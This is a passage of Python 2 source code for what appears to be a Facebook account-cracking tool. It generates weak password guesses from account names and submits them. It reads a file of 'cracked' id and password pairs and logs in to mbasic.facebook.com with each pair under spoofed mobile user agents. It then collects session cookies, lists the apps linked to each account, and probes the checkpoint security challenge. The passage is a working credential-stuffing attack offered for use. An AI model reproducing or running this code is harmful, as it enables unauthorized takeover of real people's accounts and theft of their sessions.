                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + ' ' + xz[1]]
                    elif len(xz) <= 3:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + ' ' + xz[1] + ' ' + xz[2]]
                    elif len(xz) <= 4:
                        pws = [
                         xz[0], xz[0] + '@123', xz[0] + '1234', xz[0] + '12345', xz[0] + ' ' + xz[1] + ' ' + xz[2] + ' ' + xz[3]]
                    elif len(xz) <= 3:
                        pws = [
                         '123456', 'i love you', '786786', '223344', '102030']
                    else:
                        pws = [
                         '123456', 'i love you', '786786']
                    form.submit(self.api, zz[0], pws)
                except:
                    pass

        os.remove(self.apk)
        results(ok, cp)


def relogin():
    os.system('clear')
    print checkerlogo
    print '[\033[1;97m\033[1;41m---------Checkpoints Checking Menu--------\033[0m] '
    print '--------------------------------------------'
    print '\033[1;97m[\033[1;92m*\033[1;97m] Example File Name: Cracked/cpz.txt'
    files = raw_input('\x1b[0;97m Enter Cracked Idz File Name -> \033[1;31m')
    if files == '':
        print '  [!] Enter A File Name'
        time.sleep(3)
        relogin()
    try:
        rfiles = open(files, 'r').readlines()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m Entered FileName %s%s%s Not Found! Try Another' % (h, files, p)
        relogin()
   
    print '--------------------------------------------'
    zks('Total Cracked Checkpoint Idz : \033[1;32m' % len(rfiles))
    zks('Checking Checkpoint Idz, Wait...')
    print '--------------------------------------------'
    for sz in rfiles:
        linez = sz.replace('\n', '')
        symbz = linez.split(' | ')
        print '--------------------------------------------'
        print 'CP Account: ' + linez.replace(' + ', '') + '\n'
        try:
            method(symbz[0].replace('+', ''), symbz[1])
        except requests.exceptions.ConnectionError:
            pass

    print '--------------------------------------------'
    print 'Checking Process Has Been Completed'
    raw_input(' Press Any Key To Go Back To Cracking Menu: ')
    cracking_menu()
    print '--------------------------------------------'
    menu()


def method(user, pasw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    ua4 = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537'
    ua3 = 'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586'
    ua2 = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537'
    ua1 = random.choice(['Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue

    data.update({'email': user, 'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'c_user' in ses.cookies:
        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies={'cookie': kuki}).text, 'html.parser')
        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {'aria-hidden': 'false'}) ][2:]
        print 'Successful/OK To Login : %s' % str(len(xe))
        num = 0
        for _ in xe:
            num += 1
            print '  ' + str(num) + ' ' + _[0][0] + ', ' + _[0][1]

    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        xnxx = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        zks('Total Available Checkpoint Options:  ' + str(len(ngew)))
        for opt in range(len(ngew)):
            print '[\x1b[1;33m' + str(opt + 1) + '\x1b[1;37m] ' + ngew[opt]

        if len(ngew) == 0:
            print ' Status: \x1b[1;32mOne Tap Yes / SuccessFul To Login'
        elif len(ngew) <= 5:
            print ' Status: \x1b[1;33mCheckPoint! Try Again Later  '
        else:
            print ''
    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print '\x1b[0;96m\x1b[0;97m[\x1b[1;31m\xe2\x9e\xa4\x1b[1;37m] %s' % oh
    else:
        print '\033[1;31mLogin Failed! User Id/Password Is Incorrect\n'


if __name__ == '__main__':
    os.system('git pull')
    login()
